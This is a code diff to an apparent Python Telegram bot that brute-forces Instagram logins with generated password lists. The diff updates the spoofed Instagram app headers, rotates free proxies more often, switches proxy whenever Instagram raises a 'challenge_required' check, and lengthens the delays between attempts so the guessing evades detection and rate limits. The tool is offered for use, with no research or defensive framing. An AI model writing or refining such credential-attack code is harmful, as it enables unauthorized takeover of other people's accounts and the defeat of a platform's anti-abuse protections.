@@ -10,6 +10,7 @@ import re
 import requests
 import itertools
 import os
+import uuid  # Yeni: UUID için
 from typing import List, Optional
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
 from telegram.ext import (
@@ -45,8 +46,8 @@ PROXY_APIS = [
     "https://gimmeproxy.com/api/getProxy?protocol=http",
     "http://pubproxy.com/api/proxy?limit=20&format=txt&type=http",
     "https://api.getproxylist.com/proxy?protocol[]=http&lastTested=600",
-    "https://www.proxy-list.download/api/v1/get?type=http",  # Yeni eklendi
-    "https://api.openproxylist.xyz/http.txt"  # Yeni eklendi
+    "https://www.proxy-list.download/api/v1/get?type=http",
+    "https://api.openproxylist.xyz/http.txt"
 ]
 
 # CUPP tarzı şifre oluşturucu için yapılandırma
@@ -147,7 +148,7 @@ class PasswordGenerator:
                     if len(wordlist) + len(numbered_words) >= self.max_passwords:
                         break
                 if len(wordlist) + len(numbered_words) >= self.max_passwords:
-                        break
+                    break
             wordlist.extend(numbered_words)
 
         return list(set(wordlist))[:self.max_passwords]
@@ -184,7 +185,6 @@ class InstagramBruteForce:
                 response = requests.get(api_url, timeout=10)
                 if response.status_code == 200:
                     if "json" in response.headers.get('content-type', ''):
-                        # JSON formatlı yanıt (örn. GimmeProxy, GetProxyList)
                         data = response.json()
                         if isinstance(data, list):
                             for proxy in data:
@@ -193,12 +193,11 @@ class InstagramBruteForce:
                         elif 'ip' in data and 'port' in data:
                             proxies.add(f"{data['ip']}:{data['port']}")
                     else:
-                        # Text formatlı yanıt
                         proxy_lines = response.text.splitlines()
                         for line in proxy_lines:
                             if ':' in line and line.strip():
                                 proxies.add(line.strip())
-                    logger.info(f"{api_url} 'den {len(proxy_lines if 'proxy_lines' in locals() else 1)} proxy alındı.")
+                    logger.info(f"{api_url} 'den proxy alındı.")
             except Exception as e:
                 logger.warning(f"{api_url} hatası: {e}")
         if not proxies:
@@ -252,6 +251,12 @@ class InstagramBruteForce:
             'Accept-Encoding': 'gzip, deflate, br',
             'Connection': 'keep-alive',
             'Upgrade-Insecure-Requests': '1',
+            'X-ASBD-ID': '129477',  # Yeni eklenen header
+            'X-IG-App-Locale': 'en_US',  # Yeni
+            'X-IG-Device-Locale': 'en_US',  # Yeni
+            'X-IG-Mapped-Locale': 'en_US',  # Yeni
+            'X-Pigeon-Session-Id': str(uuid.uuid4()),  # Yeni: Random session ID
+            'X-IG-App-ID': '1217981644879628'  # Güncel App ID
         })
         self.current_proxy = self._get_working_proxy()
         if self.current_proxy:
@@ -293,7 +298,7 @@ class InstagramBruteForce:
                 return self.csrf_token is not None
             except Exception as e:
                 logger.warning(f"Token alma hatası (Deneme {attempt}/{max_attempts}): {e}")
-                if progress_callback and attempt % 3 == 0:  # Daha az spam
+                if progress_callback and attempt % 3 == 0: 
                     await progress_callback(f"🔍 Token bulmaya çalışıyorum ({attempt}/{max_attempts})")
                 if attempt < max_attempts:
                     await asyncio.sleep(5)
@@ -312,9 +317,12 @@ class InstagramBruteForce:
             'Referer': self.login_url,
             'X-CSRFToken': self.csrf_token,
             'X-Instagram-AJAX': self.rollout_hash,
-            'X-IG-App-ID': '936619743392459',
+            'X-IG-App-ID': '1217981644879628',  # Güncel
             'X-IG-WWW-Claim': '0',
             'X-Requested-With': 'XMLHttpRequest',
+            'X-ASBD-ID': '129477',  # Yeni
+            'X-Pigeon-Session-Id': str(uuid.uuid4()),  # Yeni
+            'X-IG-App-Locale': 'en_US'  # Yeni
         }
         
         timestamp = int(time.time())
@@ -354,7 +362,7 @@ class InstagramBruteForce:
             await progress_callback(f"✅ Token'lar alındı! Şifreler deneniyor...")
             
             for i, password in enumerate(password_list):
-                if self.proxy_list and i % 10 == 0:
+                if self.proxy_list and i % 5 == 0:  # Daha sık proxy değiştir
                     self.current_proxy = self._get_working_proxy(progress_callback)
                     if self.current_proxy:
                         self.session.proxies = {'http': f'http://{self.current_proxy}', 'https': f'http://{self.current_proxy}'}
@@ -367,6 +375,12 @@ class InstagramBruteForce:
                 if response and response.status_code == 200:
                     try:
                         json_data = response.json()
+                        if 'challenge_required' in json_data or json_data.get('message') == 'challenge_required':
+                            result = "CHALLENGE_REQUIRED"
+                            await progress_callback(f"🔐 Şifre deneniyor ({i+1}/{total_passwords}): {password} - {result}")
+                            await progress_callback("🚧 Challenge required! Proxy değiştiriliyor...")
+                            self.current_proxy = self._get_working_proxy(progress_callback)  # Proxy değiştir
+                            continue  # Retry aynı şifre için veya skip
                         if json_data.get('authenticated'):
                             result = "SUCCESS"
                             await progress_callback(f"🔐 Şifre deneniyor ({i+1}/{total_passwords}): {password} - {result}")
@@ -396,7 +410,7 @@ class InstagramBruteForce:
                 if (i + 1) % 5 == 0:
                     await self._get_initial_cookies_and_tokens(progress_callback)
                 
-                delay = random.uniform(5, 15)
+                delay = random.uniform(15, 30)  # Delay artır
                 await asyncio.sleep(delay)
             
             report = f"📊 Rapor:\nDenenen şifre: {tried_passwords}/{total_passwords}"
